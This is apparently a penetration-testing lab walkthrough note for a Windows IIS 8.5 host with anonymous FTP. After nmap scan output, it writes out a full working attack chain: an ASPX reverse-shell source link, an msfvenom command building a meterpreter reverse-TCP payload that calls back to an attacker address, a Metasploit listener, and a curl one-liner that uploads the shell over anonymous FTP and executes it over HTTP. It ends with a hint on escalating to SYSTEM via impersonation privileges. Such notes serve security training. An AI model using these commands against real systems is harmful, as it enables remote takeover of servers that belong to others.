## nmap (21)
``` 
21/tcp    open  ftp          syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-07-19  10:25PM       <DIR>          aspnet_client
| 04-07-19  07:14PM                99710 iis-85.png
|_04-07-19  07:14PM                  701 iisstart.htm
| ftp-syst: 
|_  SYST: Windows_NT
```

## nmap (4176)
``` 
4167/tcp  open  http         syn-ack Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
```

**ASPX reverse shell**
```
#shell.aspx
https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
```

**Generate ASPX reverse shell using MSFVenom**
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.119.123 LPORT=9001 -f aspx > shell.aspx 
```

**Meterpreter listener**
```
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set lhost 192.168.119.123; set lport 9001; exploit"
```

**Upload and execute shell**
```shell
curl -u anonymous: -T shell.aspx ftp://10.11.1.13/shell.aspx && curl http://10.11.1.13:4167/shell.aspx
```


> [!info] 
> If the user has `SetImpersonate` or `SetAssignPrimaryToken` privileges then you are **SYSTEM**. 

![[disco-http-privs.png]]
